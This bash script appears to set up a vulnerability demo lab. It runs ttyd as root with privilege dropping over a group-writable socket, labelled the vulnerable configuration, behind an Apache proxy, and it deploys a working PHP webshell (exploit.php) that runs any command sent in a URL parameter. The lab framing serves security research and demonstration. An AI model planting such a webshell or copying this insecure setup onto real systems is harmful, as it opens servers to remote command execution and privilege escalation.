#!/bin/bash
# scripts/setup_full_demo.sh
# Configures a realistic End-to-End demo environment:
# 1. ttyd running as a systemd service (root -> drops privs)
# 2. Apache proxying to the ttyd unix socket (simulating web access)
# 3. Webshell (exploit.php) active for the attacker

set -e

echo "[*] Installing Apache and Dependencies..."
apt-get update
# mod_proxy_wstunnel is needed for websocket proxying (ttyd)
apt-get install -y apache2 php libapache2-mod-php

echo "[*] Enabling Apache Modules..."
a2enmod proxy
a2enmod proxy_http
a2enmod proxy_wstunnel
a2enmod rewrite

echo "[*] Configuring ttyd Systemd Service..."
# This matches the Vulnerable Configuration:
# - Run as root (to bind port/socket originally, though here using interface)
# - Drop privileges via -U (triggers the Vulnerability!)
# - Use group-writable socket directory /opt/sockets/
cat <<EOF > /etc/systemd/system/ttyd.service
[Unit]
Description=TTYD Vulnerable Service
After=network.target

[Service]
ExecStart=/usr/local/bin/ttyd -W -U svc_runner:devteam -i /opt/sockets/ttyd.sock bash
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

# Reset socket dir just in case
rm -rf /opt/sockets/*
chown root:devteam /opt/sockets
chmod 2775 /opt/sockets

echo "[*] Starting ttyd Service..."
systemctl daemon-reload
systemctl enable ttyd
systemctl restart ttyd

echo "[*] Configuring Apache Proxy..."
# Proxy localhost/ssh -> ttyd socket
cat <<EOF > /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    # Serve the Webshell from root
    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    # Proxy /console to the ttyd socket
    # Note: Apache < 2.4.47 needs distinct wstunnel config, but Debian 11 is 2.4.5x
    RewriteEngine on
    RewriteCond %{HTTP:Upgrade} websocket [NC]
    RewriteCond %{HTTP:Connection} upgrade [NC]
    RewriteRule ^/console/(.*) "unix:/opt/sockets/ttyd.sock|ws://localhost/\$1" [P,L]

    ProxyPass /console unix:/opt/sockets/ttyd.sock|http://localhost/
    ProxyPassReverse /console unix:/opt/sockets/ttyd.sock|http://localhost/
</VirtualHost>
EOF

echo "[*] Deploying Webshell..."
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"] . " 2>&1"); } else { echo "Webshell Active. User: " . exec("whoami"); } ?>' > /var/www/html/exploit.php
chown www-data:www-data /var/www/html/exploit.php
chmod 644 /var/www/html/exploit.php

# Add www-data to shared group
usermod -aG devteam www-data

echo "[*] Restarting Apache..."
systemctl restart apache2

echo "=== SETUP COMPLETE ==="
echo "1. Access ttyd console: http://localhost:8080/console/"
echo "2. Access Webshell:     http://localhost:8080/exploit.php"
